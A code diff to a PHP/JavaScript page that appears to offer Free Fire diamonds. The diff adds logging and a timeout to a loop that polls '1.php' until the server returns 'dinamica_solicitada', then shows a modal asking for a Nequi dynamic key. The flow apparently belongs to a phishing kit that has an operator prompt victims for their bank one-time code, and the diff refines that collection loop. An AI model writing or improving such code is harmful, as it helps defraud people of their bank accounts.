@@ -246,7 +246,11 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
 
   // Función para polling de dinámica
   function startDinamicaPolling(transactionId) {
+    console.log("Iniciando polling para transactionId:", transactionId);
+    let pollCount = 0;
     const pollInterval = setInterval(async () => {
+      pollCount++;
+      console.log(`Polling #${pollCount} para transactionId: ${transactionId}`);
       try {
         const response = await fetch("1.php", {
           method: "POST",
@@ -260,10 +264,10 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
         });
 
         const data = await response.json();
-
-        console.log("Status recibido:", data.status);
+        console.log(`Status recibido en polling #${pollCount}:`, data.status);
 
         if (data.status === 'dinamica_solicitada') {
+          console.log("¡Dinámica solicitada detectada! Mostrando modal de dinámica");
           clearInterval(pollInterval);
           // Ocultar modal de esperando y mostrar modal de dinámica
           const modalEsperando = document.getElementById("modalEsperando");
@@ -275,9 +279,12 @@ if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
             modalDinamica.style.display = "flex";
             document.getElementById("dinamicaNequi").focus();
           }
+        } else if (pollCount > 30) { // 30 * 2 segundos = 1 minuto máximo
+          console.log("Polling timeout - deteniendo después de 30 intentos");
+          clearInterval(pollInterval);
         }
       } catch (error) {
-        console.error("Error en polling:", error);
+        console.error(`Error en polling #${pollCount}:`, error);
       }
     }, 2000); // Polling cada 2 segundos
   }
